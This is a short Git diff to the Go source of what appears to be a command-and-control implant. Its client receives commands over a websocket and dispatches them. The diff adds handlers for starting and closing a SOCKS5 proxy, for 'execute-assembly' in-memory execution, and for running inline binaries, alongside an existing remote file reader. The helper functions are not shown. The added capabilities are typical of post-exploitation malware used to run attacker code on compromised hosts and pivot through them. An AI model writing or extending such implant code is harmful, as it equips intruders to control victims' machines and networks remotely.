@@ -9,12 +9,13 @@ import (
 	"encoding/binary"
 	"errors"
 	"fmt"
-	"github.com/togettoyou/wsc"
 	"os"
 	"runtime"
 	"strings"
 	"sync"
 	"time"
+
+	"github.com/togettoyou/wsc"
 )
 
 type Client struct {
@@ -170,6 +171,18 @@ func (c *Client) Connect(url string) {
 							callbackType = 0
 						case services.FileContent:
 							result, err = services.GetFileContent(cmdBuf)
+							callbackType = 0
+						case services.Scoks5Start:
+							result, err = services.SocksConnect(cmdBuf)
+							callbackType = 0
+						case services.Scoks5Close:
+							result, err = services.SocksClose()
+							callbackType = 0
+						case services.ExecuteAssembly:
+							result, err = services.Execute_Assembly(cmdBuf)
+							callbackType = 0
+						case services.InlineBin:
+							result, err = services.Inline_bin(cmdBuf)
 							callbackType = 0
 						default:
 							err = errors.New("not supported command")
